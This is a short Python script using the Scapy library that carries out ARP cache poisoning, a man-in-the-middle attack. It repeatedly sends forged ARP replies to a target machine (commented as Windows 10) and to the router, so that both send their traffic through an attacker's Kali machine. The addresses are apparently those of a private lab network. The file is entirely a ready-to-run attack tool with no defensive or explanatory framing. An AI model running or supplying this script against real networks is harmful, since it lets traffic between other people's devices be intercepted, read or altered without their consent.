from scapy.all import *
from scapy.layers.l2 import ARP

def spoof_target():
    my_arp_response = ARP()
    my_arp_response.op = 2
    my_arp_response.pdst = "192.168.13.128"     # TARGET MACHINE : WINDOWS 10 IP ADDRESS
    my_arp_response.hwdst = "00:0c:29:9d:d9:97" # TARGET MACHINE : WINDOWS 10 MAC ADDRESS
    my_arp_response.hwsrc = "00:0c:29:97:05:57" # ATTACKER MACHINE : KALI MAC ADDRESS
    my_arp_response.psrc = "192.168.13.2"       # FAKE ROUTER IP / PRETEND to be THAT IP
    print(my_arp_response.show())
    send(my_arp_response)

def spoof_router():
    my_arp_response = ARP()
    my_arp_response.op = 2
    my_arp_response.pdst = "192.168.13.2"       # ROUTER's IP ADDRESS
    my_arp_response.hwdst = "00:50:56:fa:96:35" # ROUTER's MAC ADDRESS
    my_arp_response.hwsrc = "00:0c:29:97:05:57" # ATTACKER MACHINE : KALI MAC ADDRESS
    my_arp_response.psrc = "192.168.13.128"     # FAKE Device / PRETEND to be THAT IP
    print(my_arp_response.show())
    send(my_arp_response)

if __name__ == "__main__":
    try:
        while True:
            spoof_target()
            spoof_router()
            time.sleep(1)
    except KeyboardInterrupt as e:
        print("PROGRAM IS TERMINATED AND RAN SUCCESSFULLY ")
